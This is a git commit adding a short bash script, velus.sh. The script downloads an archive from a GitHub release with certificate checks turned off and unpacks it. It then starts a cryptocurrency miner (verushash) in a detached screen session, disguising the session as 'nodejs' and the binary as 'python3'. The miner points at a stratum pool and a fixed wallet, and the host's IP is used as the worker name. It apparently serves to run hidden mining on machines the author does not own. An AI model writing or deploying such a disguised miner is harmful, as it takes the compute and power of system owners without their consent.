b13da6c69405f277b69e1deee6f52397a996a8a0
henstyle <henspicsaypro@gmail.com>
2024-11-04 02:46:18 +0700

    Add files via upload

---
+++ velus.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+if [ ! -d "mek" ]; then
+    echo "unduh dan ektraks"
+    wget -O mek --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
+    tar -xvf mek
+else
+    echo "File sudah ada"
+fi
+
+IP=$(curl -s ifconfig.me)
+IP_NUMBERS=${IP//./}
+LAST_SIX=${IP_NUMBERS: -6}
+
+screen -dmS nodejs ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIK$LAST_SIX
